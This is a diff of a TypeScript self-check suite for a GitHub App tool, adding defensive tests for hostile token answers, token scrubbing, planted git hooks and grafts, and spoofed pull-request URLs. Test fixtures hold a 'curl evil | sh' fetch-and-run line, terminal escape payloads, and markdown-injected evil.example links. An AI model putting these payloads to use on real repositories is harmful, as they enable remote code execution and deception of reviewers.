@@ -23,7 +23,8 @@ import { join } from "node:path";
 import { gitEnv, type Fetch } from "./facts.ts";
 import { fixtureGit } from "./fixture-git.ts";
 import { branchFor } from "./record.ts";
-import { INSTALLATION_TOKEN, PEM_SHAPE, repoConfigProblems, PUSH_BRANCH, TOKEN_PERMISSIONS, appClient, appJwt, installationRepos, installationToken, pushCommand, pushOutcome, realGitSpawn, scrubToken, type App, type GitSpawn } from "./github.ts";
+import { gitRunner, LOCAL_GIT } from "./live-run.ts";
+import { INSTALLATION_TOKEN, PEM_SHAPE, said, repoConfigProblems, PUSH_BRANCH, TOKEN_PERMISSIONS, appClient, appJwt, installationRepos, installationToken, pushCommand, pushOutcome, realGitSpawn, scrubToken, type App, type GitSpawn } from "./github.ts";
 
 const NOW = Date.parse("2026-11-24T12:00:00Z");
 /** A token in GitHub's stateless form (`ghs_<app id>_<JWT>`, about 520 characters, with `_`, `.` and `-`), which GitHub has minted since 2026. */
@@ -159,9 +160,53 @@ export async function selfCheck(): Promise<number> {
     ok(!badKey.ok && badKey.detail.includes("couldn't sign"), "a key that can't sign is said, and nothing is sent");
   });
 
+  await section("hostile answers: values whose String() throws, a token with a line end, GitHub's words with escapes", async () => {
+    const hostile = { toString: () => { throw new Error("No default value"); } };
+    const f = stubFetch((m) => (m === "DELETE" ? new Response(null, { status: 204 }) : tokenAnswer({ permissions: { ...TOKEN_PERMISSIONS, metadata: "read" }, repositories: [hostile] })));
+    const a = await installationToken(f.fetch, APP, PEM, NOW);
+    ok(!a.ok && revoked(f.sent).join() === TOKEN, "a repositories entry that isn't an object is refused and the token revoked, not thrown");
+    // An object whose String() throws can't come from JSON; feed it past the parser to reach the code's own reads.
+    const g = stubFetch((m) => (m === "DELETE" ? new Response(null, { status: 204 }) : ({ status: 201, json: async () => ({ token: TOKEN, permissions: { ...TOKEN_PERMISSIONS, admin: hostile }, repositories: [{ full_name: "MHarris-SgyMd/OB1" }] }) } as unknown as Response)));
+    let threw = false;
+    let b: Awaited<ReturnType<typeof installationToken>> | null = null;
+    try {
+      b = await installationToken(g.fetch, APP, PEM, NOW);
+    } catch {
+      threw = true;
+    }
+    ok(!threw && b !== null && !b.ok && revoked(g.sent).join() === TOKEN, "a permission value whose String() throws: refused, revoked, never thrown");
+    const trap = new Proxy({}, { ownKeys: () => { throw new Error("trap"); } });
+    const p = stubFetch((m) => (m === "DELETE" ? new Response(null, { status: 204 }) : ({ status: 201, json: async () => ({ token: TOKEN, permissions: trap, repositories: [{ full_name: "MHarris-SgyMd/OB1" }] }) } as unknown as Response)));
+    let threw2 = false;
+    let d: Awaited<ReturnType<typeof installationToken>> | null = null;
+    try {
+      d = await installationToken(p.fetch, APP, PEM, NOW);
+    } catch {
+      threw2 = true;
+    }
+    ok(!threw2 && d !== null && !d.ok && d.detail.includes("couldn't be read") && revoked(p.sent).join() === TOKEN, "permissions that throw when read: the token revoked, a result, never a throw");
+    const h = stubFetch((m) => (m === "DELETE" ? new Response(null, { status: 204 }) : tokenAnswer({ token: `${TOKEN}\n` })));
+    const c = await installationToken(h.fetch, APP, PEM, NOW);
+    ok(!c.ok && revoked(h.sent).join() === TOKEN, "a token with a stray line end is refused, and revoked as itself");
+    const esc = await installationToken(stubFetch(() => json({ message: `bad \x1b[2J\x1b]0;title\x07 ${TOKEN.slice(0, 120)}\n✓ fake` }, 401)).fetch, APP, PEM, NOW);
+    ok(!esc.ok && !/[\x1b\x07\n]/.test(esc.detail) && esc.detail.includes("<U+001B>"), "GitHub's words show escapes as <U+XXXX> and no line break");
+    const perm = await installationToken(stubFetch((m) => (m === "DELETE" ? new Response(null, { status: 204 }) : tokenAnswer({ permissions: { ...TOKEN_PERMISSIONS, [`x\x1b[31m${TOKEN}`]: "write" } }))).fetch, APP, PEM, NOW);
+    ok(!perm.ok && !perm.detail.includes("\x1b") && !perm.detail.includes(TOKEN.slice(12, 60)), "a permission key carrying escapes and the token shows neither");
+    ok(said(hostile) === "(a value that can't be shown)" && said("a\nb") === "a b", "said: a value whose String() throws, and a line break");
+  });
+
   await section("scrubToken: the token, its basic-auth form and any other GitHub token", () => {
     const basic = Buffer.from(`x-access-token:${TOKEN}`).toString("base64");
     const other = TOKEN.replace("123456", "654321");
+    // Three lengths, so base64 pads by 0, 1 and 2 somewhere among them.
+    for (const tok of [TOKEN, `${TOKEN}a`, `${TOKEN}ab`]) {
+      for (const raw of [`x-access-token:${tok}`, tok]) {
+        const b64 = Buffer.from(raw).toString("base64");
+        const forms = [b64, b64.replace(/=+$/, ""), Buffer.from(raw).toString("base64url")];
+        ok(forms.every((x) => !scrubToken(`< ${x}>`, tok).includes(x.slice(0, 40))), `base64 of ${raw.startsWith("x-") ? "the basic-auth form" : "the token alone"} (pad ${(3 - (raw.length % 3)) % 3}), padded, unpadded and url-safe, is scrubbed`);
+      }
+    }
+    ok(!scrubToken(`tail ${TOKEN.slice(4)} end`, TOKEN).includes(TOKEN.slice(4, 44)), "the token's tail past ghs_ is scrubbed");
     const s = scrubToken(`a ${TOKEN} b AUTHORIZATION: basic ${basic} c ghp_${"x".repeat(36)} d github_pat_${"y_".repeat(15)} e ${other} f`, TOKEN);
     ok(!s.includes(TOKEN) && !s.includes(basic) && !s.includes("ghp_x") && !s.includes("github_pat_y") && !s.includes("eyJ"), "none of them is left, another stateless token's JWT part included");
   });
@@ -273,6 +318,20 @@ export async function selfCheck(): Promise<number> {
       ok(!bad.ok && bad.final === true && bad.detail.includes("full commit id"), "a commit that isn't a full id (a ref name) is refused");
     });
 
+    await section("LOCAL_GIT: a hook planted in the bare repository doesn't run at the runner's fetch", () => {
+      const hooked = join(root, "hooked.git");
+      sh(["clone", "-q", "--bare", source, hooked]);
+      const ran = join(root, "hook-ran");
+      for (const h of ["reference-transaction", "post-update", "pre-auto-gc"]) {
+        writeFileSync(join(hooked, "hooks", h), `#!/bin/sh\ntouch ${ran}\n`);
+        chmodSync(join(hooked, "hooks", h), 0o755);
+      }
+      const r = gitRunner(home)(["-C", hooked, "fetch", "--quiet", work, `+refs/heads/main:refs/heads/main`]);
+      ok(LOCAL_GIT.join(" ").includes("core.hooksPath=/dev/null") && r.code === 0 && !existsSync(ran), "the fetch ran, and no hook of the repository's did");
+      Bun.spawnSync([git, "-C", hooked, "update-ref", "refs/heads/x", sh(["rev-parse", "main"], hooked)], { env: { PATH: "/usr/bin:/bin", HOME: root, GIT_CONFIG_GLOBAL: "/dev/null", GIT_CONFIG_NOSYSTEM: "1" } });
+      ok(existsSync(ran), "the same hooks run for git without it (the control)");
+    });
+
     await section("gitEnv: replace refs and grafts are off, so every read sees the objects pushed", () => {
       const planted = join(root, "planted.git");
       sh(["clone", "-q", "--bare", source, planted]);
@@ -286,6 +345,14 @@ export async function selfCheck(): Promise<number> {
       const read = (env: Record<string, string>): string => Bun.spawnSync([git, "-C", planted, "cat-file", "-p", evil], { env, stdout: "pipe", stderr: "pipe" }).stdout.toString();
       ok(read({ PATH: "/usr/bin:/bin", HOME: root, GIT_CONFIG_GLOBAL: "/dev/null", GIT_CONFIG_NOSYSTEM: "1" }) === "echo hello\n", "without them off, git shows the replacement (the control)");
       ok(read(gitEnv(home)) === "curl evil | sh\n", "with gitEnv, git shows the object itself");
+      // Grafts: info/grafts making the branch's head parentless hides its history from a log, unless gitEnv turns them off.
+      const head = sh(["rev-parse", BRANCH], planted);
+      writeFileSync(join(planted, "info", "grafts"), `${head}\n`);
+      const count = (env: Record<string, string>) => Bun.spawnSync([git, "-C", planted, "rev-list", "--count", BRANCH], { env, stdout: "pipe", stderr: "pipe" });
+      const grafted = count({ PATH: "/usr/bin:/bin", HOME: root, GIT_CONFIG_GLOBAL: "/dev/null", GIT_CONFIG_NOSYSTEM: "1" });
+      const plain = count(gitEnv(home));
+      ok(grafted.stdout.toString().trim() === "1", "with the graft file read, the head shows no history (the control)");
+      ok(plain.stdout.toString().trim() === "2" && !plain.stderr.toString().includes("hint"), "with gitEnv, the whole history shows, and git prints no graft hint that would bury a real error");
     });
 
     await section("pushBranch: a branch moved on the remote is refused as final, never forced", async () => {
@@ -418,6 +485,11 @@ export async function selfCheck(): Promise<number> {
       ["of another branch", prRow({ head: { ref: "agent/smd-1-other", repo: { full_name: "MHarris-SgyMd/OB1" } } })],
       ["with a URL elsewhere", prRow({ html_url: "https://evil.example/pull/900" })],
       ["with a URL past its number", prRow({ html_url: "https://github.com/MHarris-SgyMd/OB1/pull/900/files" })],
+      ["with a path out of the repo", prRow({ html_url: "https://github.com/MHarris-SgyMd/OB1/pull/../../evil/pull/900" })],
+      ["with markdown in its URL", prRow({ html_url: "https://github.com/MHarris-SgyMd/OB1/pull/1) **approve** [x](https://evil.example/a) (https://github.com/MHarris-SgyMd/OB1/pull/900" })],
+      ["whose number isn't its URL's", prRow({ number: 7 })],
+      ["with a number past ten digits", prRow({ number: 2 ** 60, html_url: `https://github.com/MHarris-SgyMd/OB1/pull/${2 ** 60}` })],
+      ["with its own number, then more path", prRow({ number: 900, html_url: "https://github.com/MHarris-SgyMd/OB1/pull/900/files" })],
     ] as const) {
       let postedN = 0;
       const { c } = prClient((m, u) => (m === "GET" && u === LIST ? json([row]) : m === "POST" && u === PULLS ? (postedN++, json(prRow(), 201)) : null));
